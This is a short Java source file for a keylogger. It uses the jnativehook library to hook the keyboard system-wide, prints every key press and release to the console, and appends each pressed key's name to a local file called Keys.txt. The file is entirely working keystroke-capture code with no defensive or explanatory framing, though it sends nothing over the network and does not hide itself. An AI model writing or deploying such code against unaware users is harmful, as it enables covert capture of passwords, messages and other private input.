
//author Mohammud Ibrahim
package main;
import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.NativeHookException;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.nio.file.Path;
import java.nio.file.Paths;

public class Keylogger implements NativeKeyListener {
    private static final Path file = Paths.get("Keys.txt");
    public static void main(String[] args) {

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }

        GlobalScreen.addNativeKeyListener(new Keylogger());

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent key) {
    // Dont Need this
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent key) {
        String text = NativeKeyEvent.getKeyText(key.getKeyCode());
        System.out.println("Pressed: " + text);

        try (OutputStream o = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
             PrintWriter writer = new PrintWriter(o)) {
            writer.print(text);
        } catch (IOException e) {
            System.out.println("ERROR");
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent key) {
        String text = NativeKeyEvent.getKeyText(key.getKeyCode());
        System.out.println("Released: " + text);


    }
}
